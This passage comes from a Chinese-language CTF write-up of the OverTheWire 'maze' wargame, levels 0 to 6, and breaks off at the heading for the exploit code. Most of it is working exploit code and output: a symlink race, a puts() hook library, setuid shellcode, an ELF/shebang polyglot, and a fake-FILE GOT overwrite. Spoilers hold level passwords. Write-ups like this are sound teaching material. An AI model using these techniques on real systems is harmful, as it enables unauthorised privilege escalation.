class="string">&quot;/tmp/128ecf542a35ac5270a87dc740918404&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    symlink(<span class="string">&quot;/etc/maze_pass/maze0&quot;</span>, <span class="string">&quot;/tmp/_m0&quot;</span>);</span><br><span class="line">    symlink(<span class="string">&quot;/etc/maze_pass/maze1&quot;</span>, <span class="string">&quot;/tmp/_m1&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        rename(<span class="string">&quot;/tmp/_m0&quot;</span>, TARGET);   <span class="comment">// 原子 → maze0</span></span><br><span class="line">        symlink(<span class="string">&quot;/etc/maze_pass/maze0&quot;</span>, <span class="string">&quot;/tmp/_m0&quot;</span>);</span><br><span class="line">        rename(<span class="string">&quot;/tmp/_m1&quot;</span>, TARGET);   <span class="comment">// 原子 → maze1</span></span><br><span class="line">        symlink(<span class="string">&quot;/etc/maze_pass/maze1&quot;</span>, <span class="string">&quot;/tmp/_m1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">maze0@maze:/tmp$ gcc -m32 -o toggle toggle.c</span><br><span class="line">maze0@maze:/tmp$ ./toggle &amp;                       <span class="comment"># 后台 symlink 切换</span></span><br><span class="line">maze0@maze:/tmp$ <span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 1000); <span class="keyword">do</span></span><br><span class="line">    result=$(/maze/maze0 2&gt;/dev/null)</span><br><span class="line">    <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$result</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;HIT: <span class="variable">$result</span>&quot;</span>; <span class="built_in">break</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">HIT: **********</span><br></pre></td></tr></table></figure>
-<p>原理：<code>rename()</code> 在同一文件系统上是原子的，target
-始终指向一个有效文件（无 broken symlink 窗口）。<code>access()</code>
-通过时 link 指向 maze0（maze0 可读），<code>open()</code> 时已被换为
-maze1（maze1 可读）。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">kfL7RRfpkY</span></span>
-<h1 id="level-1-level-2">level 1 → level 2</h1>
-<p>maze1 的 binary 链接了一个不存在的 <code>./libc.so.4</code>：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">maze1@maze:~$ /maze/maze1</span><br><span class="line">/maze/maze1: error <span class="keyword">while</span> loading shared libraries: ./libc.so.4: cannot open ...</span><br><span class="line"></span><br><span class="line">maze1@maze:~$ readelf -d /maze/maze1 | grep NEEDED</span><br><span class="line">  NEEDED    ./libc.so.4</span><br><span class="line">  NEEDED    libc.so.6</span><br></pre></td></tr></table></figure>
-<p>Binary 只调用 <code>puts("Hello World!")</code>。创建 hook library
-劫持 <code>puts()</code> 即可读密码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hookputs.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message)</span> &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fp = fopen(<span class="string">&quot;/etc/maze_pass/maze2&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) &#123; fread(buffer, <span class="number">29</span>, <span class="number">1</span>, fp); fclose(fp); &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PASSWORD: %s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hooked: %s\n&quot;</span>, message ? message : <span class="string">&quot;(null)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">maze1@maze:/tmp/work$ gcc -m32 -shared -fPIC -fno-stack-protector \</span><br><span class="line">    -o libc.so.4 hookputs.c -ldl</span><br><span class="line">maze1@maze:/tmp/work$ /maze/maze1</span><br><span class="line">PASSWORD: **********</span><br><span class="line">Hooked: Hello World!</span><br></pre></td></tr></table></figure>
-<p>注意需要 <code>-fno-stack-protector</code> 关闭 stack canary，否则 ld
-链接时报 <code>__stack_chk_fail_local</code> 未定义。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">PBeZRPjetr</span></span>
-<h1 id="level-2-level-3">level 2 → level 3</h1>
-<p>maze2 的 binary 从 <code>argv[1]</code> 复制 8 字节到栈上
-buffer，然后 <code>call *buffer</code> — 8 字节 shellcode 约束。</p>
-<p>反汇编要点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmpl $2, 8(%ebp)          ; if argc != 2 → exit(1)</span><br><span class="line">strncpy(buf, argv[1], 8)  ; copy 8 bytes</span><br><span class="line">mov buf_addr, %eax</span><br><span class="line">call *%eax                ; execute shellcode</span><br></pre></td></tr></table></figure>
-<p>解决方案：真正 shellcode 存入环境变量 <code>SC</code>，8 字节只做
-<code>push &lt;addr&gt;; ret</code>（6 字节）。</p>
-<p>maze3 uid = 15003 = 0x3a9b。用 pwntools 生成完整 shellcode：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">maze2@maze:/tmp/work$ python3 -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">from pwnlib.asm import asm</span></span><br><span class="line"><span class="string">import sys</span></span><br><span class="line"><span class="string">sc = asm(&#x27;</span></span><br><span class="line"><span class="string">    xor eax,eax;mov al,70</span></span><br><span class="line"><span class="string">    xor ebx,ebx;mov bx,0x3a9b</span></span><br><span class="line"><span class="string">    xor ecx,ecx;mov cx,0x3a9b</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    xor eax,eax;push eax</span></span><br><span class="line"><span class="string">    push 0x68732f2f;push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp;xor ecx,ecx</span></span><br><span class="line"><span class="string">    xor edx,edx;mov al,11</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">&#x27;, arch=&#x27;i386&#x27;)</span></span><br><span class="line"><span class="string">sys.stdout.buffer.write(b&#x27;\x90&#x27;*200 + sc)</span></span><br><span class="line"><span class="string">&quot;</span> &gt; sc.bin</span><br><span class="line"></span><br><span class="line">maze2@maze:/tmp/work$ <span class="built_in">export</span> SC=$(<span class="built_in">cat</span> sc.bin)</span><br><span class="line">maze2@maze:/tmp/work$ gcc -m32 -o getaddr -xc - &lt;&lt;&lt; <span class="string">&#x27;#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">int main()&#123;printf(&quot;SC:%p\n&quot;,getenv(&quot;SC&quot;));&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">maze2@maze:/tmp/work$ ./getaddr</span><br><span class="line">SC at 0xffffdcd0</span><br><span class="line"></span><br><span class="line">maze2@maze:/tmp/work$ /maze/maze2 $(python3 -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">from pwnlib.asm import asm</span></span><br><span class="line"><span class="string">import sys</span></span><br><span class="line"><span class="string">sys.stdout.buffer.write(asm(&#x27;push 0xffffdcd0; ret&#x27;, arch=&#x27;i386&#x27;))</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line">$ <span class="built_in">cat</span> /etc/maze_pass/maze3</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">DSEiCewQOv</span></span>
-<h1 id="level-3-level-4">level 3 → level 4</h1>
-<p>maze3 的 binary 是静态链接的（statically
-linked），使用自修改代码（self-modifying code）。</p>
-<p><code>mprotect()</code> 设置代码段 RWX，然后用 key
-<code>0x12345678</code> XOR 解码 <code>d1</code> 函数区域，reveal 出一段
-shellcode。shellcode 检查 <code>argv[1] == 0x1337c0de</code>，通过则
-<code>setreuid(maze4)</code> + <code>execve("/bin/sh")</code>。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &lt;&lt;&lt;（here-string）</span></span><br><span class="line">maze3@maze:~$ /maze/maze3 $(<span class="built_in">printf</span> <span class="string">&#x27;\xde\xc0\x37\x13&#x27;</span>) &lt;&lt;&lt; <span class="string">&quot;cat /etc/maze_pass/maze4&quot;</span></span><br><span class="line">**********</span><br></pre></td></tr></table></figure>
-<p>注意：<code>0x1337c0de</code> 作为 int 是 little-endian
-<code>\xde\xc0\x37\x13</code>。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">vghylBpihH</span></span>
-<h1 id="level-4-level-5">level 4 → level 5</h1>
-<p>maze4 的 binary 读取用户提供的文件，解析为 ELF header + program
-header，验证通过后 <code>execv()</code> 执行。</p>
-<p>验证逻辑（反汇编）：</p>
-<ol type="1">
-<li><code>read(fd, &amp;ehdr, 0x34)</code> — 读 52 bytes ELF header
-到栈上</li>
-<li><code>lseek(fd, ehdr.e_phoff, SEEK_SET)</code> — 定位到 program
-header</li>
-<li><code>read(fd, &amp;phdr, 0x20)</code> — 读 32 bytes program
-header</li>
-<li><strong>检查 1</strong>:
-<code>phdr.p_paddr == ehdr.e_ident[7] * ehdr.e_ident[8]</code>（两个
-byte 乘积）</li>
-<li><strong>检查 2</strong>:
-<code>stat.st_size &lt;= 0x7b</code>（文件大小 ≤ 123 bytes）</li>
-<li><code>puts("valid file, executing"); execv(file, NULL, NULL);</code></li>
-</ol>
-<p><code>execv()</code> 保留 setuid 权限 — 但 shell
-(<code>/bin/sh</code>) 会主动 drop privilege。需要编译一个专用 reader
-binary。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">maze4@maze:/tmp/work$ <span class="built_in">cat</span> &gt; reader.c &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="string">int main()&#123;char b[50]=&#123;0&#125;;int fd=open(&quot;/etc/maze_pass/maze5&quot;,0);</span></span><br><span class="line"><span class="string">int n=read(fd,b,49);write(1,b,n);return 0;&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">maze4@maze:/tmp/work$ TMPDIR=. gcc -m32 -o reader reader.c</span><br><span class="line">maze4@maze:/tmp/work$ <span class="built_in">ln</span> -sf reader r</span><br></pre></td></tr></table></figure>
-<p>ELF header 与 shebang <code>#!/tmp/maze4w/r\n</code>
-重叠。<code>e_ident[7]</code> 和 <code>[8]</code> 由 shebang 的第 7、8
-字节决定：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">maze4@maze:/tmp/work$ python3 -c <span class="string">&quot;</span></span><br><span class="line"><span class="string">import struct</span></span><br><span class="line"><span class="string">sh = b&#x27;#!/tmp/maze4w/r\n&#x27;</span></span><br><span class="line"><span class="string">b7, b8 = sh[7], sh[8]  # 0x6d (&#x27;m&#x27;), 0x61 (&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">prod = b7 * b8         # 0x295d</span></span><br><span class="line"><span class="string">pad = 28 - len(sh)     # 补齐到 byte 28（e_phoff 位置）</span></span><br><span class="line"><span class="string">data = sh + b&#x27;\x00&#x27;*pad + struct.pack(&#x27;&lt;I&#x27;,0x20) + b&#x27;B&#x27;*12 + struct.pack(&#x27;&lt;I&#x27;,prod) + b&#x27;C&#x27;*16</span></span><br><span class="line"><span class="string">open(&#x27;elf_file&#x27;,&#x27;wb&#x27;).write(data)</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line">maze4@maze:/tmp/work$ <span class="built_in">chmod</span> +x elf_file</span><br><span class="line">maze4@maze:/tmp/work$ /maze/maze4 elf_file</span><br><span class="line">valid file, executing</span><br><span class="line">**********</span><br></pre></td></tr></table></figure>
-<ul>
-<li>shebang 指向编译好的 reader binary（不 drop privilege）</li>
-<li>ELF header 字节与 shebang 重叠，<code>e_ident[7]</code> 和
-<code>[8]</code> 必须是 shebang 的实际字符</li>
-<li><code>e_phoff = 0x20</code> 让 program header 与 ELF header
-尾部重叠</li>
-<li><code>p_paddr</code>（PHDR 偏移 0xc）必须等于两个 e_ident
-字节的乘积</li>
-</ul>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">fobwgnzRy0</span></span>
-<h1 id="level-5-level-6">level 5 → level 6</h1>
-<p>maze5 的 binary 要求输入 username (8 字符) 和 key (8 字符)，调用
-<code>foo(user, pass)</code> 校验。</p>
-<p>反编译逻辑：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">(<span class="type">char</span>* user, <span class="type">char</span>* pass)</span> &#123;</span><br><span class="line">    <span class="type">char</span> p[<span class="number">9</span>] = &#123;<span class="number">0x70</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x74</span>, <span class="number">0x6c</span>, <span class="number">0x6f</span>, <span class="number">0x6c</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(pass); ++i) &#123;</span><br><span class="line">        p[i] -= user[i] + <span class="number">2</span> * i - <span class="number">0x41</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i = <span class="built_in">strlen</span>(pass);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        i -= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (pass[i] == p[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>要 pass：<code>user[i] + 2*i - 0x41 = 0</code> →
-<code>user[i] = chr(0x41 - 2*i)</code>。此时 <code>p</code>
-数组不变，key = 原始 p 值 = <code>printlol</code>。</p>
-<p>Binary 使用了 <code>ptrace(PTRACE_TRACEME)</code> 反调试。通过后调用
-<code>system("/bin/sh")</code>。</p>
-<p>但 pipeline 传入 input 时 <code>system()</code> 产生的 shell 会收到
-SIGTTOU。需要使用 pty：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty, os, time</span><br><span class="line"></span><br><span class="line">pid, fd = pty.fork()</span><br><span class="line"><span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">    os.execv(<span class="string">&quot;/maze/maze5&quot;</span>, [<span class="string">&quot;/maze/maze5&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    os.write(fd, <span class="string">b&quot;A?=;9753\n&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    os.write(fd, <span class="string">b&quot;printlol\n&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line">    os.write(fd, <span class="string">b&quot;cat /etc/maze_pass/maze6\n&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = os.read(fd, <span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data: <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(data.decode(errors=<span class="string">&quot;ignore&quot;</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X----------------</span><br><span class="line"> Username: A?=;9753</span><br><span class="line">      Key: printlol</span><br><span class="line"></span><br><span class="line">Yeh, here&#x27;s your shell</span><br><span class="line">**********</span><br></pre></td></tr></table></figure>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">dOM2C7ZKlG</span></span>
-<h1 id="level-6-level-7">level 6 → level 7</h1>
-<p>maze6 的 binary 是一个 strcpy overflow + memfrob XOR + fake FILE
-的组合题。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">maze6@maze:~$ /maze/maze6</span><br><span class="line">usage: /maze/maze6 file2write2 string</span><br><span class="line"></span><br><span class="line">maze6@maze:~$ /maze/maze6 /tmp/out <span class="built_in">test</span></span><br><span class="line">maze6@maze:~$ <span class="built_in">cat</span> /tmp/out</span><br><span class="line">/tmp/out : khin          <span class="comment"># &quot;test&quot; XOR 0x2A per byte = khin</span></span><br></pre></td></tr></table></figure>
-<h3 id="binary-分析">Binary 分析</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">  sub esp, 0x104         ; buf[260] at ebp-0x104</span><br><span class="line">  cmp [ebp+8], 3         ; argc == 3?</span><br><span class="line">  jne usage</span><br><span class="line">  ; fd = fopen(argv[1], &quot;w&quot;)</span><br><span class="line">  call fopen             ; → eax = 0x0804c1a0 (deterministic)</span><br><span class="line">  mov [ebp-4], eax       ; fd at ebp-4</span><br><span class="line">  ; strcpy(buf, argv[2])</span><br><span class="line">  lea eax, [ebp-0x104]</span><br><span class="line">  push [ebp+0xc]+8       ; argv[2]</span><br><span class="line">  push eax</span><br><span class="line">  call strcpy             ; NO bounds check</span><br><span class="line">  ; len = strlen(buf)</span><br><span class="line">  ; memfrob(buf, len)    ; XOR each byte with 0x2A</span><br><span class="line">  call strlen</span><br><span class="line">  push eax</span><br><span class="line">  lea eax, [ebp-0x104]</span><br><span class="line">  push eax</span><br><span class="line">  call memfrob</span><br><span class="line">  ; fprintf(fd, &quot;%s : %s\n&quot;, argv[1], buf)</span><br><span class="line">  push [ebp-0x104]        ; buf</span><br><span class="line">  push argv[1]</span><br><span class="line">  push &quot;%s : %s\n&quot;</span><br><span class="line">  push [ebp-4]            ; fd</span><br><span class="line">  call fprintf</span><br><span class="line">  ; exit(0)</span><br><span class="line">  push 0</span><br><span class="line">  call exit               ; never returns</span><br></pre></td></tr></table></figure>
-<p>安全属性（<code>readelf -l</code> + <code>objdump -R</code>）：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ASLR          off (`randomize_va_space=0`)</span><br><span class="line">RELRO         none — GOT writable</span><br><span class="line">NX            disabled — GNU_STACK RWE</span><br><span class="line">Stack canary  none (`-fno-stack-protector`)</span><br><span class="line">PIE           none — fixed base 0x08048000</span><br></pre></td></tr></table></figure>
-<p>关键常量（ASLR off 下固定）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc 32-bit base     = 0xf7d82000</span><br><span class="line">_IO_file_jumps       = 0xf7faa7a8  (libc + 0x2287a8)</span><br><span class="line">fopen → FILE*        = 0x0804c1a0  (heap)</span><br><span class="line">buf                  = 0xffffda74  (ebp-0x104)</span><br><span class="line">strcpy@got           = 0x0804b204</span><br><span class="line">exit@got             = 0x0804b208</span><br></pre></td></tr></table></figure>
-<p>栈布局（从低到高）：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ebp-0x104  buf[0]        ← strcpy 目标</span><br><span class="line">...</span><br><span class="line">ebp-0x04   fd (FILE*)    ← offset 256 from buf</span><br><span class="line">ebp        saved ebp</span><br><span class="line">ebp+0x04   return addr</span><br><span class="line">ebp+0x08   argc</span><br><span class="line">ebp+0x0c   argv</span><br></pre></td></tr></table></figure>
-<h3 id="漏洞利用链">漏洞利用链</h3>
-<p><strong>目标</strong>：覆写 <code>exit@got</code> 为 shellcode
-地址，让 <code>exit(0)</code> 跳转到 shellcode。</p>
-<p><strong>约束</strong>：</p>
-<ol type="1">
-<li><code>strcpy(buf, argv[2])</code> 只能通过 argv 传入，不能含
-<code>\x00</code>（否则 strcpy 截断）</li>
-<li><code>memfrob(buf, len)</code> XOR 整个 buf 区域 — 所有数据需
-<strong>pre-XOR</strong>（<code>payload_byte ^ 0x2A = desired_byte</code>）</li>
-<li><code>fprintf</code> 不接受 fake FILE* → 需要在栈上构造合法的
-<code>_IO_FILE</code> 结构</li>
-<li><code>exit(0)</code> 无 return → 只能通过 GOT overwrite
-劫持控制流</li>
-</ol>
-<p><strong>关键洞察 1：pre-XOR 一切</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pre_xor</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">return</span> val ^ <span class="number">0x2A2A2A2A</span>  <span class="comment"># 每个字节 XOR 0x2A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># memfrob 会把 buf[i] ^= 0x2A</span></span><br><span class="line"><span class="comment"># 所以放入 buf 的字节 = desired_byte ^ 0x2A</span></span><br><span class="line"><span class="comment"># → 经过 memfrob 后恢复为 desired_byte</span></span><br></pre></td></tr></table></figure>
-<p><strong>关键洞察 2：argv[1] 即 shellcode 地址</strong></p>
-<p>fprintf 输出 <code>"%s : %s\n"</code>，第一个 <code>%s</code> 是
-<code>argv[1]</code>（文件名）。如果 <code>argv[1]</code> 恰好是 4
-字节，则 exit@got 的前 4 字节 = <code>argv[1]</code> 的内容。</p>
-<p>因此将 <code>argv[1]</code> 设为 4 字节的 shellcode
-地址（<code>\x74\xda\xff\xff</code> = <code>0xffffda74</code>），fopen
-以 "w" 模式打开这个怪文件名不会有问题（Linux 允许任意非
-<code>\x00</code> 非 <code>/</code> 的字节做文件名）。只需从
-<code>/tmp</code> 目录运行，相对路径刚好 4 字节。</p>
-<p><strong>关键洞察 3：glibc 2.39 32-bit 的 <code>_IO_FILE</code>
-布局</strong></p>
-<p>通过 GDB dump fopen 返回的真实 FILE 结构，确定各字段偏移：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">offset  field              real FILE value    our fake FILE</span><br><span class="line">------  ----               ----------------   -------------</span><br><span class="line">0x00    _flags             0xfbad3484         0xfbad2480 (no _IO_NO_WRITES)</span><br><span class="line">0x10    _IO_write_base     0x00000000         0x0804b208 (exit@got)</span><br><span class="line">0x14    _IO_write_ptr      0x00000000         0x0804b208 (empty buffer)</span><br><span class="line">0x18    _IO_write_end      0x00000000         0x0804c208 (exit@got+0x1000)</span><br><span class="line">0x34    _chain             0xf7fabca0         0x00000000 (NULL, end of chain)</span><br><span class="line">0x38    _fileno            0x00000003         0x00000002 (stderr if overflow flush)</span><br><span class="line">0x48    _lock              0x0804c238         0x0804c238 (reuse real FILE&#x27;s lock)</span><br><span class="line">0x94    vtable             0xf7faa7a8         0xf7faa7a8 (_IO_file_jumps)</span><br></pre></td></tr></table></figure>
-<p>关键点：</p>
-<ul>
-<li><code>_IO_write_base == _IO_write_ptr == exit@got</code> → fprintf
-直接写入 GOT</li>
-<li><code>_IO_write_end</code> 远大于输出长度 → 永远不会触发 buffer
-flush（避免 vtable overflow 调用）</li>
-<li><code>_lock</code> 复用真实 FILE 的 lock（单线程程序，无竞争）</li>
-<li><code>vtable</code> 指向 libc 的合法
-<code>_IO_file_jumps</code>（通过 <code>_IO_validate_vtable</code>
-检查）</li>
-</ul>
-<h3 id="exploit-代码">Exploit 代码</h3>
